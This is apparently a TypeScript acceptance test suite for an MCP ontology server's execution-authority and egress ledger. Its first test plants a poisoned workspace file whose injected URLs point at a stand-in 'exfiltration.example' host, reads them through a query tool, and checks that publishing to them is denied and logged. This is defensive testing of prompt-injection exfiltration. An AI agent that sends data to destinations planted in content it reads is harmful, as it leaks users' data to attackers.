import { defaultPolicyRevision, EpistemicServerConfig } from "@beep/epistemic-config/server";
import { fixtureAllowedDestination, makeEpistemicConfigTest } from "@beep/epistemic-config/test";
import { GrantOperation, SinkDestination } from "@beep/epistemic-domain/values/ExecutionGrant";
import {
  destinationDigestOf,
  ExecutionRunKey,
  operationDigestOf,
  verifyExecutionDecisionChain,
  verifyOutcomeBinding,
} from "@beep/epistemic-domain/values/ExecutionRecord";
import { ExecutionLedgerDrizzle } from "@beep/epistemic-server/ExecutionLedger";
import { ExecutionLedger } from "@beep/epistemic-use-cases/ExecutionLedger";
import {
  ExportProvenanceRequest,
  ExportProvenanceTool,
  OntologySparqlQueryRequest,
  OntologySparqlQueryResponse,
  OntologyToolFailure,
  PublishProvenanceRequest,
  PublishProvenanceTool,
} from "@beep/ontology-use-cases/tools";
import { makeDrizzleLayer } from "@beep/postgres";
import { UnknownFromJsonString } from "@beep/schema/Unknown";
import { fcRuns, makePgliteIntegrationGate, makePgliteSqlTestLayer } from "@beep/test-utils";
import * as BunCrypto from "@effect/platform-bun/BunCrypto";
import { describe, expect, it, layer } from "@effect/vitest";
import { btree_gist } from "@electric-sql/pglite/contrib/btree_gist";
import * as A from "effect/Array";
import * as DateTime from "effect/DateTime";
import * as Effect from "effect/Effect";
import * as FileSystem from "effect/FileSystem";
import * as Layer from "effect/Layer";
import * as O from "effect/Option";
import * as Path from "effect/Path";
import * as Random from "effect/Random";
import * as R from "effect/Record";
import * as S from "effect/Schema";
import * as Str from "effect/String";
import { FastCheck as fc } from "effect/testing";
import * as SqlClient from "effect/unstable/sql/SqlClient";
import { migrateOnBoot } from "@/runtime/Migrations";
import {
  decodeOntologyFilePath,
  makeMcpClient,
  openThroughMcp,
  withHttpServer,
} from "./support/ontology-mcp-harness.ts";
import type { ExecutionDecisionRecord, ExecutionOutcomeRecord } from "@beep/epistemic-domain/values/ExecutionRecord";

const { pgliteIntegrationTimeoutMillis } = makePgliteIntegrationGate();
const workspaceCanary = "EXECUTION_AUTHORITY_WORKSPACE_CANARY_7E3B2D1A";
const publishBodyCanary = "EXECUTION_AUTHORITY_PUBLISH_BODY_CANARY_8F4C3E2B";
const responseBodyCanary = "EXECUTION_AUTHORITY_RESPONSE_BODY_CANARY_9A5D4F3C";
const refusalGuidance = "This action is not authorized for this session. Resolve the mutation tier and retry.";

const encodeJson = UnknownFromJsonString.encodeUnknownEffect;
const encodeSparqlQueryRequest = S.encodeUnknownEffect(OntologySparqlQueryRequest);
const decodeSparqlQueryResponse = S.decodeUnknownEffect(OntologySparqlQueryResponse);
const encodeExportProvenanceRequest = S.encodeUnknownEffect(ExportProvenanceRequest);
const encodePublishProvenanceRequest = S.encodeUnknownEffect(PublishProvenanceRequest);
const decodeOntologyToolFailure = S.decodeUnknownEffect(OntologyToolFailure);

const makeInProcessPgliteLayer = () =>
  Layer.fresh(makePgliteSqlTestLayer({ inProcess: { extensions: { btree_gist } }, mode: "in-process" }));

const makeAcceptanceLayer = () =>
  ExecutionLedgerDrizzle.pipe(
    Layer.provideMerge(makeDrizzleLayer()),
    Layer.provideMerge(makeInProcessPgliteLayer()),
    Layer.provideMerge(BunCrypto.layer)
  );

const rawSql = Effect.map(SqlClient.SqlClient, (client) => client.withoutTransforms());

const readRunKeys = Effect.fnUntraced(function* () {
  const sql = yield* rawSql;
  const rows = yield* sql<{ readonly run_key: string }>`
    SELECT DISTINCT run_key FROM epistemic_execution_decision
  `;
  return A.map(rows, (row) => row.run_key);
});

const readNewChains = Effect.fnUntraced(function* (before: ReadonlyArray<string>) {
  const ledger = yield* ExecutionLedger;
  const after = yield* readRunKeys();
  const fresh = A.filter(after, (runKey) => !A.contains(before, runKey));
  return yield* Effect.forEach(fresh, (runKey) => ledger.readDecisions(ExecutionRunKey.make(runKey)));
});

const readLedgerSnapshot = Effect.fnUntraced(function* () {
  const ledger = yield* ExecutionLedger;
  const runKeys = yield* readRunKeys();
  return {
    decisions: A.flatten(
      yield* Effect.forEach(runKeys, (runKey) => ledger.readDecisions(ExecutionRunKey.make(runKey)))
    ),
    outcomes: A.flatten(yield* Effect.forEach(runKeys, (runKey) => ledger.readOutcomes(ExecutionRunKey.make(runKey)))),
  };
});

const newDecisions = (
  before: ReadonlyArray<ExecutionDecisionRecord>,
  after: ReadonlyArray<ExecutionDecisionRecord>
): ReadonlyArray<ExecutionDecisionRecord> =>
  A.filter(after, (record) => !A.some(before, (previous) => previous.hash === record.hash));

const newOutcomes = (
  before: ReadonlyArray<ExecutionOutcomeRecord>,
  after: ReadonlyArray<ExecutionOutcomeRecord>
): ReadonlyArray<ExecutionOutcomeRecord> =>
  A.filter(after, (record) => !A.some(before, (previous) => previous.hash === record.hash));

const canaryWorkspace = `@prefix ex: <https://example.test/> .
ex:canary ex:value "${workspaceCanary}" .
`;

describe("professional desktop execution-authority schema laws", () => {
  it("generates valid ontology SPARQL query requests", () => {
    fc.assert(fc.property(S.toArbitrary(OntologySparqlQueryRequest)(fc), S.is(OntologySparqlQueryRequest)), fcRuns(25));
  });
});

describe("professional desktop execution authority PgLite acceptance", { concurrent: false }, () => {
  layer(makeAcceptanceLayer(), { timeout: "5 minutes" })((it) => {
    it.effect(
      "denies a destination parsed from a poisoned MCP read at egress while the session gate allows publication",
      Effect.fnUntraced(function* () {
        yield* migrateOnBoot;
        const ledger = yield* ExecutionLedger;
        const runKeysBefore = yield* readRunKeys();
        const nonce = `${yield* Random.nextInt}-${yield* Random.nextInt}`;
        let firstInjectedDestination = `https://exfiltration.example/collect/${nonce}/first`;
        let secondInjectedDestination = `https://exfiltration.example/collect/${nonce}/second`;
        const poisonedWorkspace = `@prefix ex: <https://example.test/> .

ex:poison
  ex:firstDestination <${firstInjectedDestination}> ;
  ex:secondDestination <${secondInjectedDestination}> .
`;
        const attemptedUrls: Array<string> = [];
        function egressFetch(
          input: Parameters<typeof globalThis.fetch>[0],
          _init?: Parameters<typeof globalThis.fetch>[1]
        ): ReturnType<typeof globalThis.fetch> {
          attemptedUrls.push(new Request(input).url);
          return Promise.resolve(new Response("stored", { status: 202 }));
        }
        egressFetch.preconnect = globalThis.fetch.preconnect;

        const { firstRead, secondRead } = yield* withHttpServer(
          {
            mutationsEnabled: true,
            approvedMutationTools: [PublishProvenanceTool.name],
            egressFetch,
            epistemicConfig: makeEpistemicConfigTest(
              EpistemicServerConfig.make({
                destinationAllowlist: [fixtureAllowedDestination],
                policyRevision: defaultPolicyRevision,
              })
            ),
            ledger: Layer.succeed(ExecutionLedger, ledger),
          },
          (root, ontologyPath) =>
            Effect.gen(function* () {
              const fileSystem = yield* FileSystem.FileSystem;
              const path = yield* Path.Path;
              const provenancePath = yield* decodeOntologyFilePath("poisoned.prov.ttl");
              yield* fileSystem.writeFileString(path.join(root, ontologyPath), poisonedWorkspace);
              yield* fileSystem.writeFileString(path.join(root, provenancePath), "published provenance");

              const client = yield* makeMcpClient();
              const readDestination = Effect.fn("ExecutionAuthorityTest.readInjectedDestination")(function* (
                predicate: "firstDestination" | "secondDestination"
              ) {
                const queryRequest = yield* encodeSparqlQueryRequest(
                  OntologySparqlQueryRequest.make({
                    path: ontologyPath,
                    profile: "select",
                    query: `PREFIX ex: <https://example.test/>
SELECT ?destination WHERE {
  ex:poison ex:${predicate} ?destination .
}`,
                  })
                );
                const queryCall = yield* client["tools/call"]({
                  name: "ontology_sparql_query",
                  arguments: queryRequest,
                });
                const queryJson = yield* encodeJson(queryCall.structuredContent);
                const query = yield* decodeSparqlQueryResponse(queryCall.structuredContent);
                expect(queryCall.isError).toBe(false);
                const destinationTerm = O.getOrThrow(
                  query.query.result.profile === "select"
                    ? O.flatMap(A.head(query.query.result.rows), (row) => R.get(row, "destination"))
                    : O.none()
                );
                return { destination: destinationTerm.value, json: queryJson };
              });
              const firstRead = yield* readDestination("firstDestination");
              const secondRead = yield* readDestination("secondDestination");

              expect(Str.includes(firstInjectedDestination)(firstRead.json)).toBe(true);
              expect(Str.includes(secondInjectedDestination)(secondRead.json)).toBe(true);
              expect(firstRead.destination).toBe(firstInjectedDestination);
              expect(secondRead.destination).toBe(secondInjectedDestination);

              // Make the fixture generators stale after decoding. A publish
              // that bypasses the decoded MCP values now targets different
              // destinations and fails the ledger assertions below.
              firstInjectedDestination = `${firstInjectedDestination}/stale`;
              secondInjectedDestination = `${secondInjectedDestination}/stale`;

              const allowedDestination = `${fixtureAllowedDestination}/acceptance`;
              const allowedCall = yield* client["tools/call"]({
                name: PublishProvenanceTool.name,
                arguments: yield* encodePublishProvenanceRequest(
                  PublishProvenanceRequest.make({
                    provPath: provenancePath,
                    destination: allowedDestination,
                  })
                ),
              });
              expect(allowedCall.isError).toBe(false);

              const firstDeniedCall = yield* client["tools/call"]({
                name: PublishProvenanceTool.name,
                arguments: yield* encodePublishProvenanceRequest(
                  PublishProvenanceRequest.make({
                    provPath: provenancePath,
                    destination: firstRead.destination,
                  })
                ),
              });
              const secondDeniedCall = yield* client["tools/call"]({
                name: PublishProvenanceTool.name,
                arguments: yield* encodePublishProvenanceRequest(
                  PublishProvenanceRequest.make({
                    provPath: provenancePath,
                    destination: secondRead.destination,
                  })
                ),
              });

              expect(firstDeniedCall.isError).toBe(true);
              expect(secondDeniedCall.isError).toBe(true);
              const firstRefusal = yield* decodeOntologyToolFailure(firstDeniedCall.structuredContent);
              const secondRefusal = yield* decodeOntologyToolFailure(secondDeniedCall.structuredContent);
              expect(firstRefusal._tag).toBe("OntologyTierGateRefusal");
              expect(secondRefusal._tag).toBe("OntologyTierGateRefusal");
              expect(firstRefusal._tag === "OntologyTierGateRefusal" && firstRefusal.guidance).toBe(refusalGuidance);
              expect(secondRefusal._tag === "OntologyTierGateRefusal" && secondRefusal.guidance).toBe(refusalGuidance);
              return { firstRead, secondRead };
            })
        );

        const allowedDestination = `${fixtureAllowedDestination}/acceptance`;
        expect(A.contains(attemptedUrls, allowedDestination)).toBe(true);
        expect(A.contains(attemptedUrls, firstRead.destination)).toBe(false);
        expect(A.contains(attemptedUrls, secondRead.destination)).toBe(false);

        const chains = yield* readNewChains(runKeysBefore);
        expect(chains).toHaveLength(2);
        const firstInjectedDigest = destinationDigestOf(SinkDestination.make(firstRead.destination));
        const secondInjectedDigest = destinationDigestOf(SinkDestination.make(secondRead.destination));
        const injectedDigests = [firstInjectedDigest, secondInjectedDigest];
        const egressChain = O.getOrThrow(
          A.findFirst(chains, (chain) =>
            A.some(chain, (record) => A.contains(injectedDigests, record.destinationDigest))
          )
        );
        const sessionChain = O.getOrThrow(
          A.findFirst(chains, (chain) =>
            A.every(chain, (record) => !A.contains(injectedDigests, record.destinationDigest))
          )
        );
        const egressRunKey = O.getOrThrow(A.head(egressChain)).runKey;
        const sessionRunKey = O.getOrThrow(A.head(sessionChain)).runKey;

        expect(A.map(sessionChain, (record) => record.verdict)).toEqual(["allowed", "allowed", "allowed"]);
        expect(verifyExecutionDecisionChain(sessionChain, sessionRunKey).result).toBe("chain-intact");
        expect(yield* ledger.readOutcomes(sessionRunKey)).toHaveLength(3);

        expect(A.map(egressChain, (record) => record.verdict)).toEqual(["allowed", "denied", "denied"]);
        expect(O.getOrThrow(A.head(egressChain)).destinationDigest).toBe(
          destinationDigestOf(SinkDestination.make(allowedDestination))
        );
        const deniedRecords = A.drop(egressChain, 1);
        expect(deniedRecords).toHaveLength(2);
        const firstDeniedRecord = O.getOrThrow(A.head(deniedRecords));
        const secondDeniedRecord = O.getOrThrow(A.last(deniedRecords));
        expect(firstDeniedRecord.verdict === "denied" && firstDeniedRecord.reason).toBe("destination-not-granted");
        expect(secondDeniedRecord.verdict === "denied" && secondDeniedRecord.reason).toBe("destination-not-granted");
        expect(firstDeniedRecord.destinationDigest).not.toBe(secondDeniedRecord.destinationDigest);
        expect(firstDeniedRecord.destinationDigest).toBe(firstInjectedDigest);
        expect(secondDeniedRecord.destinationDigest).toBe(secondInjectedDigest);
        expect(verifyExecutionDecisionChain(egressChain, egressRunKey).result).toBe("chain-intact");
        const egressOutcomes = yield* ledger.readOutcomes(egressRunKey);
        expect(egressOutcomes).toHaveLength(1);
        expect(verifyOutcomeBinding(O.getOrThrow(A.head(egressOutcomes)), O.getOrThrow(A.head(egressChain)))).toBe(
          true
        );
        expect(
          A.every(deniedRecords, (record) => A.every(egressOutcomes, (outcome) => outcome.decisionHash !== record.hash))
        ).toBe(true);
        expect(yield* ledger.readUnsettledAllowed(egressRunKey)).toEqual([]);

        // The two independent runs are correlated by ordering in time, not by
        // inventing an MCP session inside the promise-returning Fetch boundary.
        expect(DateTime.toEpochMillis(O.getOrThrow(A.last(egressChain)).decidedAt)).toBeGreaterThanOrEqual(
          DateTime.toEpochMillis(O.getOrThrow(A.last(sessionChain)).decidedAt)
        );
      }),
      pgliteIntegrationTimeoutMillis
    );
  });

  layer(makeAcceptanceLayer(), { timeout: "5 minutes" })((it) => {
    it.effect(
      "pins exact ledger columns and stores no reachable publish-body canary",
      Effect.fnUntraced(function* () {
        yield* migrateOnBoot;
        const ledger = yield* ExecutionLedger;
        const requestBodies: Array<string> = [];
        const responseBodies: Array<string> = [];
        function egressFetch(
          _input: Parameters<typeof globalThis.fetch>[0],
          init?: Parameters<typeof globalThis.fetch>[1]
        ): ReturnType<typeof globalThis.fetch> {
          return new Response(init?.body).text().then((body) => {
            requestBodies.push(body);
            const response = new Response(`stub response ${responseBodyCanary}`, { status: 202 });
            return response
              .clone()
              .text()
              .then((responseBody) => {
                responseBodies.push(responseBody);
                return response;
              });
          });
        }
        egressFetch.preconnect = globalThis.fetch.preconnect;

        yield* withHttpServer(
          {
            mutationsEnabled: true,
            approvedMutationTools: [PublishProvenanceTool.name],
            egressFetch,
            ledger: Layer.succeed(ExecutionLedger, ledger),
          },
          (root, ontologyPath) =>
            Effect.gen(function* () {
              const fileSystem = yield* FileSystem.FileSystem;
              const path = yield* Path.Path;
              const provenancePath = yield* decodeOntologyFilePath("canary.prov.ttl");
              yield* fileSystem.writeFileString(path.join(root, ontologyPath), canaryWorkspace);
              yield* fileSystem.writeFileString(path.join(root, provenancePath), `publish body ${publishBodyCanary}`);

              const client = yield* makeMcpClient();
              const workspaceReadCall = yield* client["tools/call"]({
                name: "ontology_sparql_query",
                arguments: yield* encodeSparqlQueryRequest(
                  OntologySparqlQueryRequest.make({
                    path: ontologyPath,
                    profile: "select",
                    query: `PREFIX ex: <https://example.test/>
SELECT ?value WHERE {
  ex:canary ex:value ?value .
}`,
                  })
                ),
              });
              expect(workspaceReadCall.isError).toBe(false);
              yield* decodeSparqlQueryResponse(workspaceReadCall.structuredContent);
              const workspaceReadJson = yield* encodeJson(workspaceReadCall.structuredContent);
              expect(Str.includes(workspaceCanary)(workspaceReadJson)).toBe(true);

              const call = yield* client["tools/call"]({
                name: PublishProvenanceTool.name,
                arguments: yield* encodePublishProvenanceRequest(
                  PublishProvenanceRequest.make({
                    provPath: provenancePath,
                    destination: `${fixtureAllowedDestination}/canary`,
                  })
                ),
              });
              expect(call.isError).toBe(false);
            })
        );

        expect(A.some(requestBodies, Str.includes(publishBodyCanary))).toBe(true);
        expect(A.some(responseBodies, Str.includes(responseBodyCanary))).toBe(true);
        const sql = yield* rawSql;
        const columnRows = yield* sql<{
          readonly column_name: string;
          readonly data_type: string;
          readonly table_name: string;
        }>`
          SELECT table_name, column_name, data_type
          FROM information_schema.columns
          WHERE table_schema = current_schema()
            AND table_name IN ('epistemic_execution_decision', 'epistemic_execution_outcome')
          ORDER BY table_name, ordinal_position
        `;
        expect(columnRows).toEqual([
          { table_name: "epistemic_execution_decision", column_name: "run_key", data_type: "text" },
          { table_name: "epistemic_execution_decision", column_name: "seq", data_type: "integer" },
          { table_name: "epistemic_execution_decision", column_name: "prev_hash", data_type: "text" },
          { table_name: "epistemic_execution_decision", column_name: "hash", data_type: "text" },
          { table_name: "epistemic_execution_decision", column_name: "verdict", data_type: "text" },
          { table_name: "epistemic_execution_decision", column_name: "reason", data_type: "text" },
          { table_name: "epistemic_execution_decision", column_name: "operation_digest", data_type: "text" },
          { table_name: "epistemic_execution_decision", column_name: "sink_class", data_type: "text" },
          { table_name: "epistemic_execution_decision", column_name: "audience", data_type: "text" },
          { table_name: "epistemic_execution_decision", column_name: "destination_digest", data_type: "text" },
          { table_name: "epistemic_execution_decision", column_name: "grant_set_digest", data_type: "text" },
          { table_name: "epistemic_execution_decision", column_name: "policy_revision", data_type: "text" },
          { table_name: "epistemic_execution_decision", column_name: "decided_at", data_type: "bigint" },
          { table_name: "epistemic_execution_outcome", column_name: "run_key", data_type: "text" },
          { table_name: "epistemic_execution_outcome", column_name: "decision_hash", data_type: "text" },
          { table_name: "epistemic_execution_outcome", column_name: "decision_verdict", data_type: "text" },
          { table_name: "epistemic_execution_outcome", column_name: "settlement", data_type: "text" },
          { table_name: "epistemic_execution_outcome", column_name: "recorded_at", data_type: "bigint" },
          { table_name: "epistemic_execution_outcome", column_name: "hash", data_type: "text" },
        ]);

        const decisionRows = yield* sql<Record<string, unknown>>`
          SELECT * FROM epistemic_execution_decision
        `;
        const outcomeRows = yield* sql<Record<string, unknown>>`
          SELECT * FROM epistemic_execution_outcome
        `;
        expect(A.length(decisionRows)).toBeGreaterThan(0);
        expect(A.length(outcomeRows)).toBeGreaterThan(0);

        const serializedRows = yield* encodeJson(A.appendAll(decisionRows, outcomeRows));
        expect(Str.includes(publishBodyCanary)(serializedRows)).toBe(false);

        // The workspace canary reaches the MCP read boundary, but this publish
        // call never reads the workspace file. The response body reaches the
        // stub boundary, but production consumes only its status. Neither can
        // reach the ledger write path, so neither is part of the canary claim.
      }),
      pgliteIntegrationTimeoutMillis
    );
  });

  layer(makeAcceptanceLayer(), { timeout: "5 minutes" })((it) => {
    it.effect(
      "counts tier-only and governed-egress write deltas structurally",
      Effect.fnUntraced(function* () {
        yield* migrateOnBoot;
        const ledger = yield* ExecutionLedger;
        const sqlClient = yield* SqlClient.SqlClient;
        const snapshot = readLedgerSnapshot().pipe(
          Effect.provideService(ExecutionLedger, ledger),
          Effect.provideService(SqlClient.SqlClient, sqlClient)
        );

        const exportWindow = yield* withHttpServer(
          {
            mutationsEnabled: true,
            approvedMutationTools: [ExportProvenanceTool.name],
            ledger: Layer.succeed(ExecutionLedger, ledger),
          },
          (root, ontologyPath) =>
            Effect.gen(function* () {
              const fileSystem = yield* FileSystem.FileSystem;
              const path = yield* Path.Path;
              const client = yield* makeMcpClient();
              const opened = yield* openThroughMcp(client, ontologyPath);
              const provPath = yield* decodeOntologyFilePath("cost.prov.ttl");
              const datasetPath = yield* decodeOntologyFilePath("cost.dataset.ttl");
              const before = yield* snapshot;
              const call = yield* client["tools/call"]({
                name: ExportProvenanceTool.name,
                arguments: yield* encodeExportProvenanceRequest(
                  ExportProvenanceRequest.make({
                    path: ontologyPath,
                    baseIri: O.none(),
                    sessionHandle: O.none(),
                    expectedFingerprint: opened.fingerprint,
                    provPath,
                    datasetPath,
                  })
                ),
              });
              const after = yield* snapshot;

              expect(call.isError).toBe(false);
              expect(yield* fileSystem.exists(path.join(root, provPath))).toBe(true);
              return { after, before };
            })
        );

        const exportDecisions = newDecisions(exportWindow.before.decisions, exportWindow.after.decisions);
        const exportOutcomes = newOutcomes(exportWindow.before.outcomes, exportWindow.after.outcomes);
        expect(exportDecisions).toHaveLength(1);
        expect(exportOutcomes).toHaveLength(1);
        const exportDecision = O.getOrThrow(A.head(exportDecisions));
        const exportOutcome = O.getOrThrow(A.head(exportOutcomes));
        expect(exportDecision.verdict).toBe("allowed");
        expect(exportDecision.operationDigest).toBe(operationDigestOf(GrantOperation.make(ExportProvenanceTool.name)));
        expect(exportDecision.destinationDigest).toBe(
          destinationDigestOf(SinkDestination.make("workspace://ontology"))
        );
        expect(verifyOutcomeBinding(exportOutcome, exportDecision)).toBe(true);

        function successfulEgressFetch(
          _input: Parameters<typeof globalThis.fetch>[0],
          _init?: Parameters<typeof globalThis.fetch>[1]
        ): ReturnType<typeof globalThis.fetch> {
          return Promise.resolve(new Response("stored", { status: 202 }));
        }
        successfulEgressFetch.preconnect = globalThis.fetch.preconnect;
        const publishDestination = `${fixtureAllowedDestination}/cost`;

        const publishWindow = yield* withHttpServer(
          {
            mutationsEnabled: true,
            approvedMutationTools: [PublishProvenanceTool.name],
            egressFetch: successfulEgressFetch,
            ledger: Layer.succeed(ExecutionLedger, ledger),
          },
          (root) =>
            Effect.gen(function* () {
              const fileSystem = yield* FileSystem.FileSystem;
              const path = yield* Path.Path;
              const provPath = yield* decodeOntologyFilePath("cost-publish.prov.ttl");
              yield* fileSystem.writeFileString(path.join(root, provPath), "published provenance");
              const client = yield* makeMcpClient();
              const before = yield* snapshot;
              const call = yield* client["tools/call"]({
                name: PublishProvenanceTool.name,
                arguments: yield* encodePublishProvenanceRequest(
                  PublishProvenanceRequest.make({
                    provPath,
                    destination: publishDestination,
                  })
                ),
              });
              const after = yield* snapshot;
              expect(call.isError).toBe(false);
              return { after, before };
            })
        );

        const publishDecisions = newDecisions(publishWindow.before.decisions, publishWindow.after.decisions);
        const publishOutcomes = newOutcomes(publishWindow.before.outcomes, publishWindow.after.outcomes);
        expect(publishDecisions).toHaveLength(2);
        expect(publishOutcomes).toHaveLength(2);
        const tierDecision = O.getOrThrow(
          A.findFirst(
            publishDecisions,
            (record) =>
              record.operationDigest === operationDigestOf(GrantOperation.make(PublishProvenanceTool.name)) &&
              record.destinationDigest === destinationDigestOf(SinkDestination.make("network://governed-egress"))
          )
        );
        const egressDecision = O.getOrThrow(
          A.findFirst(
            publishDecisions,
            (record) =>
              record.operationDigest === operationDigestOf(GrantOperation.make("http-egress")) &&
              record.destinationDigest === destinationDigestOf(SinkDestination.make(publishDestination))
          )
        );
        expect(tierDecision.verdict).toBe("allowed");
        expect(egressDecision.verdict).toBe("allowed");
        const tierOutcome = O.getOrThrow(
          A.findFirst(publishOutcomes, (outcome) => outcome.decisionHash === tierDecision.hash)
        );
        const egressOutcome = O.getOrThrow(
          A.findFirst(publishOutcomes, (outcome) => outcome.decisionHash === egressDecision.hash)
        );
        expect(verifyOutcomeBinding(tierOutcome, tierDecision)).toBe(true);
        expect(verifyOutcomeBinding(egressOutcome, egressDecision)).toBe(true);
        expect(yield* ledger.readUnsettledAllowed(egressDecision.runKey)).toEqual([]);
      }),
      pgliteIntegrationTimeoutMillis
    );
  });
});
